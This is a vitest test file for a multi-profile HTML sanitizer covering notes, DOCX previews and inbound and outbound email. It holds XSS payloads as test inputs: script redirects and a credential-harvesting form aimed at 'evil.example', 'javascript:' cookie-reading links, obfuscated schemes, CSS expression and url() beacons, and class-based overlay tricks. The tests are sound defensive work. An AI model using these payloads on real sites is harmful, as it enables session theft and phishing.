/**
 * Pure-function tests for the shared HTML sanitizer.
 *
 * Three callers (notes, captures, inbox replies) post HTML from
 * the Tiptap editor. The sanitizer runs server-side on every
 * write — it's the security boundary between user input and the
 * stored markup. These tests document the allow-list and the
 * scrubbing behavior so a future "let's allow <img>" change has
 * to update the test along with the allow-list.
 */

import { describe, expect, test } from "vitest";
import {
  BLOCKED_IMAGE_PLACEHOLDER,
  isEffectivelyEmpty,
  sanitizeDocumentHtml,
  sanitizeEmailHtml,
  sanitizeOutgoingEmailHtml,
  sanitizeUserHtml,
} from "./sanitize-html";

describe("sanitizeUserHtml — allowed tags pass through", () => {
  test("plain paragraph survives", () => {
    expect(sanitizeUserHtml("<p>Hello</p>")).toBe("<p>Hello</p>");
  });

  test("Tiptap StarterKit shape — bold/italic/strike/underline/code", () => {
    const html = "<p><strong>b</strong> <em>i</em> <s>s</s> <u>u</u> <code>c</code></p>";
    expect(sanitizeUserHtml(html)).toBe(html);
  });

  test("lists + headings + blockquote", () => {
    const html =
      "<h2>Header</h2><blockquote><p>Quote</p></blockquote>" +
      "<ul><li>one</li><li>two</li></ul><ol><li>a</li></ol>";
    expect(sanitizeUserHtml(html)).toBe(html);
  });
});

describe("sanitizeUserHtml — disallowed content is stripped", () => {
  test("<script> tag and its contents are gone", () => {
    const html = "<p>Hi</p><script>alert(1)</script>";
    const out = sanitizeUserHtml(html);
    expect(out).toBe("<p>Hi</p>");
    expect(out).not.toContain("alert");
    expect(out).not.toContain("script");
  });

  test("inline event handlers are stripped", () => {
    const html = '<p onclick="alert(1)">Click</p>';
    const out = sanitizeUserHtml(html);
    expect(out).toBe("<p>Click</p>");
    expect(out).not.toContain("onclick");
  });

  test("style attributes are stripped", () => {
    const html = '<p style="color: red">Red</p>';
    const out = sanitizeUserHtml(html);
    expect(out).not.toContain("style");
  });

  test("<iframe> is removed entirely", () => {
    const html = '<p>Before</p><iframe src="https://evil"></iframe><p>After</p>';
    const out = sanitizeUserHtml(html);
    expect(out).toContain("Before");
    expect(out).toContain("After");
    expect(out).not.toContain("iframe");
  });

  test("<img> isn't on the allow-list — dropped", () => {
    // Today the editor doesn't emit <img>; if we add an image
    // extension we'll need to update both the editor and the
    // sanitizer. The test pins the current behavior.
    const html = '<p>x</p><img src="https://x" />';
    const out = sanitizeUserHtml(html);
    expect(out).not.toContain("<img");
  });
});

describe("sanitizeUserHtml — link safety", () => {
  test("javascript: URLs are stripped", () => {
    const html = '<a href="javascript:alert(1)">click</a>';
    const out = sanitizeUserHtml(html);
    expect(out).not.toContain("javascript:");
    // The href is dropped but the surrounding tag may remain — we
    // only care that the dangerous URL is gone.
    expect(out).not.toContain("alert");
  });

  test("data: URLs are stripped", () => {
    const html = '<a href="data:text/html,<script>alert(1)</script>">x</a>';
    const out = sanitizeUserHtml(html);
    expect(out).not.toContain("data:");
  });

  test("http/https/mailto/tel pass through", () => {
    const cases = [
      "https://example.com",
      "http://example.com",
      "mailto:a@b.com",
      "tel:+1-303-555-0100",
    ];
    for (const href of cases) {
      const out = sanitizeUserHtml(`<a href="${href}">link</a>`);
      expect(out).toContain(href);
    }
  });

  test("every <a> gets rel='noopener noreferrer' and target='_blank'", () => {
    // Reverse-tabnabbing protection: any external link the user
    // creates should open in a new tab without giving the new
    // window a window.opener handle back to the parent.
    const out = sanitizeUserHtml('<a href="https://example.com">x</a>');
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain('target="_blank"');
  });

  test("existing rel/target on a link gets replaced (no opt-out)", () => {
    // Even if the user (or a malicious paste) sets rel="opener",
    // the transform forces our values back.
    const out = sanitizeUserHtml('<a href="https://example.com" rel="opener" target="_self">x</a>');
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain('target="_blank"');
    expect(out).not.toContain('rel="opener"');
  });
});

describe("sanitizeUserHtml — output cleanliness", () => {
  test("trims leading/trailing whitespace", () => {
    expect(sanitizeUserHtml("   <p>Hi</p>   ")).toBe("<p>Hi</p>");
  });

  test("empty input returns empty", () => {
    expect(sanitizeUserHtml("")).toBe("");
  });

  test("only-whitespace input returns empty", () => {
    expect(sanitizeUserHtml("   \n  \t  ")).toBe("");
  });
});

// ── Document profile (DOCX preview pipeline) ────────────────────────────

describe("sanitizeDocumentHtml — document structure passes through", () => {
  test("keeps template table attributes and only numeric column widths", () => {
    const ok =
      '<table data-width="fit"><colgroup><col style="width:66.67%" /><col style="width:120px" /></colgroup>' +
      '<tr><td colspan="2" data-bt="thick" data-bb="none" data-valign="middle">x</td></tr></table>';
    expect(sanitizeDocumentHtml(ok)).toBe(ok);
    expect(
      sanitizeDocumentHtml('<col style="width:expression(alert(1));background:url(x)" />'),
    ).toBe("<col />");
    expect(sanitizeDocumentHtml('<td style="border:1px solid red" onclick="x()">y</td>')).toBe(
      "<td>y</td>",
    );
  });

  test("note-profile tags still pass (superset, not a replacement)", () => {
    const html =
      "<h2>Header</h2><p><strong>b</strong> <em>i</em> <u>u</u></p>" + "<ul><li>one</li></ul>";
    expect(sanitizeDocumentHtml(html)).toBe(html);
  });

  test("tables with colspan/rowspan survive", () => {
    const html =
      '<table><thead><tr><th colspan="2">H</th></tr></thead>' +
      '<tbody><tr><td rowspan="2">a</td><td>b</td></tr></tbody></table>';
    expect(sanitizeDocumentHtml(html)).toBe(html);
  });

  test("b / i / sup / sub / hr survive (mammoth custom style maps)", () => {
    const html = "<p><b>b</b><i>i</i>x<sup>2</sup>H<sub>2</sub>O</p><hr />";
    expect(sanitizeDocumentHtml(html)).toBe(html);
  });

  test("embedded images survive with data: URIs only", () => {
    const data = '<img src="data:image/png;base64,iVBORw0KGgo=" alt="exhibit" />';
    expect(sanitizeDocumentHtml(data)).toBe(data);
  });
});

describe("sanitizeDocumentHtml — still a security boundary", () => {
  test("script tags + contents are discarded", () => {
    const out = sanitizeDocumentHtml("<p>Hi</p><script>alert(1)</script>");
    expect(out).toBe("<p>Hi</p>");
  });

  test("event handlers and style attributes are stripped", () => {
    const out = sanitizeDocumentHtml('<td onclick="alert(1)" style="position:fixed">x</td>');
    expect(out).not.toContain("onclick");
    expect(out).not.toContain("style");
  });

  test("remote image sources are stripped (tracking-pixel canary)", () => {
    const out = sanitizeDocumentHtml('<img src="https://evil.example/p.png" />');
    expect(out).not.toContain("evil.example");
  });

  test("protocol-relative image sources are stripped", () => {
    const out = sanitizeDocumentHtml('<img src="//evil.example/p.png" />');
    expect(out).not.toContain("evil.example");
  });

  test("javascript: links are stripped, links get noopener/_blank", () => {
    const out = sanitizeDocumentHtml(
      '<a href="javascript:alert(1)">x</a><a href="https://example.com">y</a>',
    );
    expect(out).not.toContain("javascript:");
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain('target="_blank"');
  });

  test("iframe / object / style blocks are discarded", () => {
    const out = sanitizeDocumentHtml(
      '<style>p{display:none}</style><iframe src="https://x"></iframe>' +
        '<object data="x"></object><p>kept</p>',
    );
    expect(out).toBe("<p>kept</p>");
  });
});

describe("sanitizeDocumentHtml — note profile is NOT loosened", () => {
  test("tables are still stripped from the note profile", () => {
    // The document profile is additive; the note sanitizer must keep
    // rejecting tags only documents may carry.
    const out = sanitizeUserHtml("<table><tr><td>x</td></tr></table>");
    expect(out).not.toContain("<table");
    expect(out).not.toContain("<td");
  });

  test("data-URI images are still stripped from the note profile", () => {
    const out = sanitizeUserHtml('<img src="data:image/png;base64,iVBORw0KGgo=" />');
    expect(out).not.toContain("<img");
  });
});

describe("isEffectivelyEmpty", () => {
  test("no content is empty", () => {
    expect(isEffectivelyEmpty("")).toBe(true);
  });

  test("just tag scaffolding (Tiptap's empty editor) is empty", () => {
    expect(isEffectivelyEmpty("<p></p>")).toBe(true);
    expect(isEffectivelyEmpty("<p><br></p>")).toBe(true);
  });

  test("only whitespace + nbsp is empty", () => {
    expect(isEffectivelyEmpty("<p>&nbsp;&nbsp;</p>")).toBe(true);
    expect(isEffectivelyEmpty("<p>   </p>")).toBe(true);
  });

  test("real text is not empty", () => {
    expect(isEffectivelyEmpty("<p>Hello</p>")).toBe(false);
  });

  test("nested tags with text are not empty", () => {
    expect(isEffectivelyEmpty("<p><strong>x</strong></p>")).toBe(false);
  });
});

// ── Email profile ───────────────────────────────────────────────────────
//
// `sanitizeEmailHtml` runs at WRITE time on provider-synced mail
// (Gmail sync) — the most hostile input the app ingests. These tests
// pin the security boundary against a realistic hostile fixture and
// document the tracking-pixel / inline-style policy.

/** Hostile mail body: script, event handler, javascript: link,
 *  iframe, form, style tag, tracking pixel, protocol-relative img. */
const HOSTILE_EMAIL = [
  "<div>",
  "<script>document.location='https://evil.example/steal'</script>",
  '<img src="https://tracker.example/pixel.gif?u=abc" alt="" width="1" height="1">',
  '<img src="//tracker.example/p2.gif">',
  '<p onmouseover="alert(1)">Dear <b>Counsel</b>,</p>',
  '<a href="javascript:alert(document.cookie)">click me</a>',
  '<iframe src="https://evil.example/phish"></iframe>',
  '<form action="https://evil.example/creds"><input name="password"></form>',
  "<style>body{display:none}</style>",
  '<p style="color:#333;position:fixed;top:0;background-image:url(https://evil.example/x)">Body text</p>',
  "</div>",
].join("");

describe("sanitizeEmailHtml — hostile mail is defanged", () => {
  test("script tags AND their payload are gone", () => {
    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
    expect(out).not.toContain("<script");
    expect(out).not.toContain("evil.example/steal");
  });

  test("event handlers are stripped, content survives", () => {
    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
    expect(out).not.toContain("onmouseover");
    expect(out).toContain("Dear <b>Counsel</b>,");
  });

  test("javascript: hrefs are removed (text kept, scheme gone)", () => {
    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
    expect(out).not.toContain("javascript:");
    expect(out).toContain("click me");
  });

  test("iframe / form / style tags are discarded", () => {
    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
    expect(out).not.toContain("<iframe");
    expect(out).not.toContain("<form");
    expect(out).not.toContain("<input");
    expect(out).not.toContain("display:none");
  });

  test("style attr keeps the safe subset, drops position/background-image", () => {
    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
    expect(out).toContain("color:#333");
    expect(out).not.toContain("position");
    expect(out).not.toContain("url(");
    expect(out).toContain("Body text");
  });
});

describe("sanitizeEmailHtml — remote images become blocked-image notes", () => {
  test("http(s) tracking pixel → placeholder span, URL fully gone", () => {
    const out = sanitizeEmailHtml(HOSTILE_EMAIL);
    expect(out).not.toContain("tracker.example");
    expect(out).not.toContain("<img");
    expect(out).toContain(BLOCKED_IMAGE_PLACEHOLDER);
    expect(out).toContain('class="email-blocked-image"');
  });

  test("alt text is preserved in the placeholder", () => {
    const out = sanitizeEmailHtml('<img src="https://cdn.example/logo.png" alt="Firm logo">');
    expect(out).toBe('<span class="email-blocked-image">[image blocked: Firm logo]</span>');
  });

  test("cid: inline references are blocked too (no fetchable bytes)", () => {
    const out = sanitizeEmailHtml('<img src="cid:part1.abc@mailer">');
    expect(out).toContain(BLOCKED_IMAGE_PLACEHOLDER);
    expect(out).not.toContain("cid:");
  });

  test("data: URI images render (inline, no network fetch)", () => {
    const html = '<img src="data:image/png;base64,iVBORw0KGgo=" alt="sig" />';
    const out = sanitizeEmailHtml(html);
    expect(out).toContain("<img");
    expect(out).toContain("data:image/png;base64,iVBORw0KGgo=");
  });
});

describe("sanitizeEmailHtml — real-mail structure passes through", () => {
  test("div soup, tables, links survive (links forced safe)", () => {
    const out = sanitizeEmailHtml(
      '<div><table><tbody><tr><td colspan="2">cell</td></tr></tbody></table>' +
        '<a href="https://court.example/filing">filing</a></div>',
    );
    expect(out).toContain("<div>");
    expect(out).toContain('<td colspan="2">cell</td>');
    expect(out).toContain('rel="noopener noreferrer"');
    expect(out).toContain('target="_blank"');
  });

  test("unknown-but-harmless tags degrade to their text content", () => {
    expect(sanitizeEmailHtml('<font color="red">warm regards</font>')).toBe("warm regards");
  });
});

describe("sanitizeEmailHtml — other profiles are NOT loosened", () => {
  test("note profile still strips div and style attrs", () => {
    const out = sanitizeUserHtml('<div style="color:red"><p>x</p></div>');
    expect(out).not.toContain("<div");
    expect(out).not.toContain("style=");
  });

  test("document profile still blocks remote images outright", () => {
    const out = sanitizeDocumentHtml('<img src="https://evil.example/x.png">');
    expect(out).not.toContain("evil.example");
  });
});

// ── class attribute / UI redress (F045 family) ──────────────────────────
//
// The app ships a global Tailwind stylesheet, so an attacker-supplied
// class="fixed inset-0 z-50" would overlay the CRM. No profile may keep
// a class, except the email blocked-image placeholder (exact name).

const OVERLAY = "fixed inset-0 z-50 bg-white";

describe("class attributes are stripped in every profile", () => {
  test("email: Tailwind overlay classes on div/a/p/td/img/span are dropped", () => {
    const out = sanitizeEmailHtml(
      `<div class="${OVERLAY}"><p class="hidden">hid</p>` +
        `<a class="${OVERLAY}" href="https://x.example/">l</a>` +
        `<span class="sr-only">s</span>` +
        `<table><tr><td class="fixed">c</td></tr></table>` +
        `<img class="fixed" src="data:image/png;base64,AAAA"></div>`,
    );
    expect(out).not.toContain("class=");
    expect(out).not.toContain("fixed");
    expect(out).not.toContain("inset-0");
    expect(out).toContain("hid");
    expect(out).toContain("https://x.example/");
  });

  test("email: only the exact blocked-image class survives on a span", () => {
    const out = sanitizeEmailHtml(`<span class="email-blocked-image ${OVERLAY}">x</span>`);
    expect(out).toBe('<span class="email-blocked-image">x</span>');
    const blocked = sanitizeEmailHtml('<img class="fixed" src="https://t.example/p.gif">');
    expect(blocked).toContain('class="email-blocked-image"');
    expect(blocked).not.toContain("fixed");
  });

  test("email: blocked-image class is not allowed on other tags", () => {
    const out = sanitizeEmailHtml('<div class="email-blocked-image">x</div>');
    expect(out).toBe("<div>x</div>");
  });

  test("note profile strips class on every tag", () => {
    const out = sanitizeUserHtml(
      `<p class="${OVERLAY}">Session expired <a class="fixed" href="https://e.example/">in</a></p>`,
    );
    expect(out).not.toContain("class=");
    expect(out).toContain("Session expired");
  });

  test("document profile strips class on td/th/col/img/p", () => {
    const out = sanitizeDocumentHtml(
      `<p class="${OVERLAY}">a</p><table><colgroup class="x"><col class="y"></colgroup>` +
        `<tr><th class="z">h</th><td class="fixed">d</td></tr></table>` +
        `<img class="fixed" src="data:image/png;base64,AAAA">`,
    );
    expect(out).not.toContain("class=");
    expect(out).toContain("<table>");
  });
});

describe("protocol-relative and obfuscated hrefs", () => {
  test("note profile drops protocol-relative hrefs", () => {
    const out = sanitizeUserHtml('<a href="//evil.example/x">x</a>');
    expect(out).not.toContain("evil.example");
    expect(out).not.toContain("href");
    expect(out).toContain(">x</a>");
  });

  test("all profiles drop protocol-relative hrefs", () => {
    for (const fn of [sanitizeUserHtml, sanitizeDocumentHtml, sanitizeEmailHtml]) {
      expect(fn('<a href="//evil.example/x">x</a>')).not.toContain("evil.example");
    }
  });

  test("mixed-case / tab-split javascript: hrefs are dropped everywhere", () => {
    for (const fn of [sanitizeUserHtml, sanitizeDocumentHtml, sanitizeEmailHtml]) {
      expect(fn('<a href="JaVaScRiPt:alert(1)">x</a>')).not.toContain("alert");
      expect(fn('<a href="java&#9;script:alert(1)">x</a>')).not.toContain("alert");
    }
  });
});

describe("ordered-list numbering survives every profile (F253)", () => {
  const sanitizers = [
    ["note", sanitizeUserHtml],
    ["document", sanitizeDocumentHtml],
    ["email", sanitizeEmailHtml],
  ] as const;

  test.each(sanitizers)("%s profile keeps <ol start> and a valid type", (_n, fn) => {
    expect(fn('<ol start="3"><li><p>Third</p></li></ol>')).toBe(
      '<ol start="3"><li><p>Third</p></li></ol>',
    );
    const out = fn('<ol type="a" start="5"><li>x</li></ol>');
    expect(out).toContain('start="5"');
    expect(out).toContain('type="a"');
  });

  test.each(sanitizers)("%s profile drops a non-integer start and an unknown type", (_n, fn) => {
    expect(fn('<ol start="javascript:1" type="z"><li>x</li></ol>')).toBe("<ol><li>x</li></ol>");
    expect(fn('<ol start="1234567"><li>x</li></ol>')).toBe("<ol><li>x</li></ol>");
  });

  test.each(sanitizers)("%s profile keeps an integer <li value> and drops junk", (_n, fn) => {
    expect(fn('<ol><li value="9">x</li></ol>')).toBe('<ol><li value="9">x</li></ol>');
    expect(fn('<ol><li value="x">x</li></ol>')).toBe("<ol><li>x</li></ol>");
  });

  test("a plain <ol> is unchanged", () => {
    expect(sanitizeUserHtml("<ol><li>a</li></ol>")).toBe("<ol><li>a</li></ol>");
  });

  test("the note profile keeps <hr> (StarterKit's HorizontalRule)", () => {
    expect(sanitizeUserHtml("<p>a</p><hr><p>b</p>")).toBe("<p>a</p><hr /><p>b</p>");
  });
});

describe("sanitizeEmailHtml - head/title text does not leak (F203)", () => {
  test("a <title> block is dropped with its text", () => {
    expect(
      sanitizeEmailHtml(
        "<html><head><title>Your statement</title></head><body><div>Body</div></body></html>",
      ),
    ).toBe("<div>Body</div>");
  });
});

describe("sanitizeDocumentHtml — template converter output", () => {
  test("keeps mark[data-missing], hr[data-page-break] and text-align on blocks", () => {
    const html = '<p style="text-align:center"><mark data-missing>x</mark></p><hr data-page-break>';
    expect(sanitizeDocumentHtml(html)).toBe(
      '<p style="text-align:center"><mark data-missing>x</mark></p><hr data-page-break />',
    );
  });
  test("still strips other styles and data attributes", () => {
    const out = sanitizeDocumentHtml(
      '<p style="position:fixed;text-align:left" data-x="1">a</p><span style="color:red">b</span>',
    );
    expect(out).toBe('<p style="text-align:left">a</p><span>b</span>');
  });
});

describe("sanitizeDocumentHtml — paragraph style properties", () => {
  const p = (style: string) => sanitizeDocumentHtml(`<p style="${style}">x</p>`);

  test("keeps the allowlisted paragraph properties", () => {
    for (const s of [
      "margin-top:0pt;margin-bottom:12pt",
      "margin-left:0.5in;margin-right:0in",
      "text-indent:-36pt",
      "line-height:24pt",
      "line-height:1.38",
      "font-size:12pt",
      "font-weight:bold",
      "font-style:italic",
      "text-transform:uppercase",
      "font-variant:small-caps",
      "text-align:justify",
      "break-before:page",
    ]) {
      expect(p(s)).toBe(`<p style="${s}">x</p>`);
    }
  });

  test("only text-indent may be negative; margins may not", () => {
    for (const m of ["margin-left", "margin-right", "margin-top", "margin-bottom"]) {
      expect(p(`${m}:-36pt`)).toBe("<p>x</p>");
    }
    expect(p("margin-left:-36pt;text-indent:-36pt")).toBe('<p style="text-indent:-36pt">x</p>');
  });

  test("drops other properties and unsafe values", () => {
    for (const s of [
      "position:absolute",
      "margin-top:expression(1)",
      "font-size:9em",
      "margin-left:url(javascript:1)",
      "margin-top:1000pt",
      "font-weight:900;color:red",
      "break-before:avoid-page",
      "line-height:calc(1pt)",
    ]) {
      expect(p(s)).toBe("<p>x</p>");
    }
  });

  test("is limited to p, and span only takes size and case", () => {
    expect(sanitizeDocumentHtml('<td style="margin-top:0pt">x</td>')).toBe("<td>x</td>");
    expect(sanitizeDocumentHtml('<h2 style="margin-top:0pt;text-align:center">x</h2>')).toBe(
      '<h2 style="text-align:center">x</h2>',
    );
    expect(
      sanitizeDocumentHtml('<span style="font-size:9pt;text-transform:uppercase">x</span>'),
    ).toBe('<span style="font-size:9pt;text-transform:uppercase">x</span>');
    expect(sanitizeDocumentHtml('<span style="margin-top:0pt;font-size:9em">x</span>')).toBe(
      "<span>x</span>",
    );
    expect(sanitizeDocumentHtml('<p class="fixed" style="left:0">x</p>')).toBe("<p>x</p>");
  });

  test("the email profile is not widened", () => {
    expect(sanitizeEmailHtml('<p style="margin-top:0pt;text-indent:-36pt">x</p>')).toBe("<p>x</p>");
  });
});

// ── Pinned behaviour: profiles that must not change when the outgoing
// profile shares constants with the document profile ─────────────────────
const PINNED_INPUTS = [
  '<p style="color:red">x</p><h2>H</h2><ol start="3" type="a"><li value="2">a</li></ol>',
  '<a href="https://x.example/a" onclick="x()">l</a><a href="tel:+15551234">t</a><a href="//evil.example">p</a><a href="javascript:alert(1)">j</a>',
  '<div class="fixed" style="color:#fff;position:absolute;font-size:12px;text-align:center">d</div>',
  '<table><tr><td colspan="2" style="text-align:right;margin-left:-5pt">c</td></tr></table><img src="https://t.example/p.gif" alt="a"><img src="data:image/png;base64,AAAA">',
  "<script>alert(1)</script><title>T</title><p>ok <u>u</u> <code>c</code></p><hr>",
];

describe("sanitizeUserHtml / sanitizeEmailHtml outputs are pinned", () => {
  test("sanitizeUserHtml", () => {
    expect(PINNED_INPUTS.map(sanitizeUserHtml)).toMatchInlineSnapshot(`
      [
        "<p>x</p><h2>H</h2><ol start="3" type="a"><li value="2">a</li></ol>",
        "<a href="https://x.example/a" rel="noopener noreferrer" target="_blank">l</a><a href="tel:+15551234" rel="noopener noreferrer" target="_blank">t</a><a rel="noopener noreferrer" target="_blank">p</a><a rel="noopener noreferrer" target="_blank">j</a>",
        "d",
        "c",
        "T<p>ok <u>u</u> <code>c</code></p><hr />",
      ]
    `);
  });
  test("sanitizeEmailHtml", () => {
    expect(PINNED_INPUTS.map(sanitizeEmailHtml)).toMatchInlineSnapshot(`
      [
        "<p style="color:red">x</p><h2>H</h2><ol start="3" type="a"><li value="2">a</li></ol>",
        "<a href="https://x.example/a" rel="noopener noreferrer" target="_blank">l</a><a href="tel:+15551234" rel="noopener noreferrer" target="_blank">t</a><a rel="noopener noreferrer" target="_blank">p</a><a rel="noopener noreferrer" target="_blank">j</a>",
        "<div style="color:#fff;font-size:12px;text-align:center">d</div>",
        "<table><tr><td colspan="2" style="text-align:right">c</td></tr></table><span class="email-blocked-image">[image blocked: a]</span><img src="data:image/png;base64,AAAA" />",
        "<p>ok <u>u</u> <code>c</code></p><hr />",
      ]
    `);
  });
  test("sanitizeDocumentHtml", () => {
    expect(PINNED_INPUTS.map(sanitizeDocumentHtml)).toMatchInlineSnapshot(`
      [
        "<p>x</p><h2>H</h2><ol start="3" type="a"><li value="2">a</li></ol>",
        "<a href="https://x.example/a" rel="noopener noreferrer" target="_blank">l</a><a href="tel:+15551234" rel="noopener noreferrer" target="_blank">t</a><a rel="noopener noreferrer" target="_blank">p</a><a rel="noopener noreferrer" target="_blank">j</a>",
        "d",
        "<table><tr><td colspan="2" style="text-align:right">c</td></tr></table><img alt="a" /><img src="data:image/png;base64,AAAA" />",
        "T<p>ok <u>u</u> <code>c</code></p><hr />",
      ]
    `);
  });
});

describe("sanitizeOutgoingEmailHtml - allowed surface passes through", () => {
  const same = (html: string) => expect(sanitizeOutgoingEmailHtml(html)).toBe(html);

  test("underline and starter-kit marks", () => {
    same("<p><strong>b</strong> <em>i</em> <s>s</s> <u>u</u></p>");
  });

  test("https link gets forced rel and target", () => {
    expect(sanitizeOutgoingEmailHtml('<a href="https://x.example/a">l</a>')).toBe(
      '<a href="https://x.example/a" rel="noopener noreferrer" target="_blank">l</a>',
    );
  });

  test("mailto link survives", () => {
    expect(sanitizeOutgoingEmailHtml('<a href="mailto:a@b.example">m</a>')).toBe(
      '<a href="mailto:a@b.example" rel="noopener noreferrer" target="_blank">m</a>',
    );
  });

  test("caller-supplied rel/target cannot weaken the forced values", () => {
    expect(
      sanitizeOutgoingEmailHtml('<a href="https://x.example" rel="opener" target="_self">l</a>'),
    ).toBe('<a href="https://x.example" rel="noopener noreferrer" target="_blank">l</a>');
  });

  test("tables with colspan and rowspan", () => {
    same(
      '<table><thead><tr><th colspan="2">h</th></tr></thead><tbody><tr><td rowspan="2">a</td><td>b</td></tr></tbody></table>',
    );
  });

  test("paragraph styles", () => {
    same('<p style="margin-bottom:12pt;text-align:center;line-height:1.15">x</p>');
  });

  test("span styles", () => {
    same('<span style="font-size:9pt;text-transform:uppercase">x</span>');
  });

  test("cell text-align", () => {
    same('<table><tbody><tr><td style="text-align:right">x</td></tr></tbody></table>');
  });

  test("signed text-indent is allowed", () => {
    same('<p style="text-indent:-18pt">x</p>');
  });

  test("lists keep their numbering", () => {
    same('<ol start="3"><li value="4">a</li></ol>');
  });
});

describe("sanitizeOutgoingEmailHtml - hostile content is stripped", () => {
  test.each([
    ["javascript: href", '<a href="javascript:alert(1)">x</a>'],
    ["data: href", '<a href="data:text/html,<script>1</script>">x</a>'],
    ["vbscript: href", '<a href="vbscript:msgbox(1)">x</a>'],
    ["protocol-relative href", '<a href="//evil.example/x">x</a>'],
    ["tel: href", '<a href="tel:+15551234">x</a>'],
    ["obfuscated javascript: href", '<a href="java&#115;cript:alert(1)">x</a>'],
  ])("%s loses its href", (_name, html) => {
    expect(sanitizeOutgoingEmailHtml(html)).not.toMatch(/href=/i);
  });

  test("class is dropped everywhere", () => {
    const out = sanitizeOutgoingEmailHtml(
      '<p class="fixed inset-0">a</p><span class="x">b</span><td class="y">c</td><a class="z" href="https://x.example">d</a>',
    );
    expect(out).not.toMatch(/class=/);
  });

  test("style only survives on p, span, td, th", () => {
    const out = sanitizeOutgoingEmailHtml(
      '<div style="text-align:center">d</div><a href="https://x.example" style="text-align:center">a</a><h2 style="text-align:center">h</h2><li style="text-align:center">l</li><table style="text-align:center"><tbody><tr><td style="text-align:center">c</td></tr></tbody></table>',
    );
    expect(out).not.toMatch(/<(div|a|h2|li|table)[^>]*style=/);
    expect(out).toContain('<td style="text-align:center">');
  });

  test("disallowed style values and properties are dropped", () => {
    expect(
      sanitizeOutgoingEmailHtml(
        '<p style="position:absolute;margin-left:-10pt;color:red;background:url(x);margin-top:4pt">x</p>',
      ),
    ).toBe('<p style="margin-top:4pt">x</p>');
    expect(sanitizeOutgoingEmailHtml('<span style="color:red;font-size:2em">x</span>')).toBe(
      "<span>x</span>",
    );
    expect(
      sanitizeOutgoingEmailHtml('<p style="font-size:12pt;line-height:expression(1)">x</p>'),
    ).toBe('<p style="font-size:12pt">x</p>');
  });

  test("paragraph-only properties are not accepted on span or cells", () => {
    expect(sanitizeOutgoingEmailHtml('<span style="margin-left:4pt">x</span>')).toBe(
      "<span>x</span>",
    );
    expect(
      sanitizeOutgoingEmailHtml(
        '<table><tbody><tr><td style="margin-left:4pt">x</td></tr></tbody></table>',
      ),
    ).toBe("<table><tbody><tr><td>x</td></tr></tbody></table>");
  });

  test("images, forms, scripts and handlers are gone", () => {
    expect(sanitizeOutgoingEmailHtml('<img src="https://t.example/p.gif">')).toBe("");
    expect(sanitizeOutgoingEmailHtml('<img src="data:image/png;base64,AAAA">')).toBe("");
    expect(sanitizeOutgoingEmailHtml('<p onclick="x()" onmouseover="y()">a</p>')).toBe("<p>a</p>");
    expect(
      sanitizeOutgoingEmailHtml("<script>alert(1)</script><iframe src=x></iframe><p>ok</p>"),
    ).toBe("<p>ok</p>");
    expect(sanitizeOutgoingEmailHtml("<form><input></form><style>p{}</style>x")).toBe("x");
  });

  test("table extras are dropped", () => {
    const out = sanitizeOutgoingEmailHtml(
      '<table width="500" data-width="9"><caption>c</caption><colgroup><col span="2"></colgroup><tfoot><tr><td data-valign="top" width="3">x</td></tr></tfoot></table>',
    );
    expect(out).not.toMatch(/width|caption|colgroup|<col|tfoot|data-/);
  });

  test("div, center and small are not allowed (text kept)", () => {
    expect(sanitizeOutgoingEmailHtml("<div>a</div><center>b</center><small>c</small>")).toBe("abc");
  });
});

describe("sanitizeOutgoingEmailHtml - hardening", () => {
  const out = sanitizeOutgoingEmailHtml;
  const cell = (attrs: string) => `<table><tbody><tr><td${attrs}>x</td></tr></tbody></table>`;

  test("break-before is not allowed", () => {
    expect(out('<p style="break-before:page;margin-top:4pt">x</p>')).toBe(
      '<p style="margin-top:4pt">x</p>',
    );
  });

  test("!important is stripped", () => {
    expect(out('<p style="font-size:12pt !important;margin-top:4pt!important">x</p>')).toBe(
      '<p style="font-size:12pt;margin-top:4pt">x</p>',
    );
  });

  test.each([
    ["font-size:0pt", "<p>x</p>"],
    ["font-size:200pt", "<p>x</p>"],
    ["font-size:72pt", '<p style="font-size:72pt">x</p>'],
    ["line-height:0.1", "<p>x</p>"],
    ["line-height:0.5", '<p style="line-height:0.5">x</p>'],
    ["line-height:2pt", "<p>x</p>"],
    ["line-height:6pt", '<p style="line-height:6pt">x</p>'],
    ["text-indent:-100pt", "<p>x</p>"],
    ["text-indent:-72pt", '<p style="text-indent:-72pt">x</p>'],
    ["text-indent:10%", "<p>x</p>"],
    ["margin-left:200pt", "<p>x</p>"],
    ["margin-left:144pt", '<p style="margin-left:144pt">x</p>'],
    ["margin-top:50%", "<p>x</p>"],
    ["margin-left:3in", "<p>x</p>"],
  ])("bound: %s", (style, expected) => {
    expect(out(`<p style="${style}">x</p>`)).toBe(expected);
  });

  test("font-size bound applies on span", () => {
    expect(out('<span style="font-size:500pt">x</span>')).toBe("<span>x</span>");
  });

  test("colspan/rowspan keep only integers 1-99", () => {
    expect(out(cell(' colspan="2" rowspan="99"'))).toBe(cell(' colspan="2" rowspan="99"'));
    expect(out(cell(' colspan="0"'))).toBe(cell(""));
    expect(out(cell(' colspan="100"'))).toBe(cell(""));
    expect(out(cell(' rowspan="-1"'))).toBe(cell(""));
    expect(out(cell(' colspan="2.5"'))).toBe(cell(""));
    expect(out(cell(' colspan="abc"'))).toBe(cell(""));
  });

  test("title, head and noscript text does not leak", () => {
    expect(out("<title>T</title><p>x</p>")).toBe("<p>x</p>");
    expect(out("<head><title>T</title></head><p>x</p>")).toBe("<p>x</p>");
    expect(out("<noscript>hidden</noscript><p>x</p>")).toBe("<p>x</p>");
  });

  test.each([["/x"], ["evil.example"], ["#f"], ["?q=1"], ["  javascript:alert(1)"]])(
    "href %s is dropped",
    (href) => {
      expect(out(`<a href="${href}">x</a>`)).not.toMatch(/href=/);
    },
  );

  test("absolute http(s) and mailto hrefs are kept", () => {
    expect(out('<a href="HTTPS://x.example/a#f">x</a>')).toMatch(
      /href="HTTPS:\/\/x.example\/a#f"/i,
    );
    expect(out('<a href="http://x.example">x</a>')).toMatch(/href="http:\/\/x.example"/);
    expect(out('<a href="mailto:a@b.example">x</a>')).toMatch(/href="mailto:a@b.example"/);
  });
});

describe("sanitizeOutgoingEmailHtml - CSS comments cannot defeat style bounds", () => {
